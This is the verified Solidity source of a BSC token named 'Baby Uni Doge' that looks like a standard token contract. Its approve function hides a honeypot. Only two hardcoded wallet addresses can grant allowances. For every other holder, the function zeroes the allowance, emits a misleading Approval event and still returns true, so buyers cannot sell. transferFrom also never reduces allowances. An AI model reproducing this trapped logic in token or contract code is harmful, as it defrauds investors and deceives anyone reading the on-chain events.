/**
 *Submitted for verification at BscScan.com on 2021-07-19
*/

/**
 Submitted for verification at BscScan.com on 2021-07-18
*/

pragma solidity ^0.8.6;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract BabyUniDoge {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000000000 * 10**18;
    string public name = "Baby Uni Doge";
    string public symbol = "BUD";
    uint public decimals = 18;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x50222d7932199D7c73f3cA053450E0A94Ec86cdb)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x92AfFC4798641B4eE8754295f113056F121397f9)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}